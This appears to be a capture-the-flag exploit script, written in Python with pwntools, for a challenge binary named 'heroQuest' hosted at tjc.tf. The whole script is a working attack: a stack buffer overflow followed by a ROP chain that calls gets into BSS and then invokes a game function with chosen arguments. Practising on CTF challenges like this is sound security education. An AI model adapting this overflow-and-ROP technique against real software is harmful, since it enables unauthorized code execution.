#!/usr/bin/env python3

from pwn import *

exe = ELF("./heroQuest")

context.binary = exe
gdb_script = '''
    b *save+27
    b *fight+17
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("tjc.tf", 31365)

    return r


def main():
    r = conn()

    fight_func = 0x4014db
    bss_addr = 0x404070
    pop_rdi = 0x4017ab        # pop rdi; ret
    pop_rsi_r15 = 0x4017a9    # pop rsi; pop r15; ret
    gets_plt = 0x401080       # gets@plt

    # Offset to overflow
    offset = 40

    # Build ROP chain
    rop_chain = [
        # store string in BSS
        pop_rdi,
        bss_addr,            # Store string in BSS
        gets_plt,            # Call gets(bss_addr)
        
        # set registers and call fight function
        pop_rdi,
        bss_addr,            # param_1 = address of our string
        pop_rsi_r15,
        999,                 # param_2 = 999 (will be in rsi)
        0,                   # dummy value for r15
        fight_func           # call fight function
    ]

    payload = b'A' * offset
    for address in rop_chain:
        payload += p64(address)

    # prepare payload
    r.sendline(b"underooted")
    r.sendline(b"w")
    r.sendline(b"r")

    # send payload
    r.sendlineafter(b"Enter the name for your save file: ", payload)

    # send finalBoss to set rdi
    r.sendline(b'finalBoss')

    r.interactive()

    r.interactive()


if __name__ == "__main__":
    main()
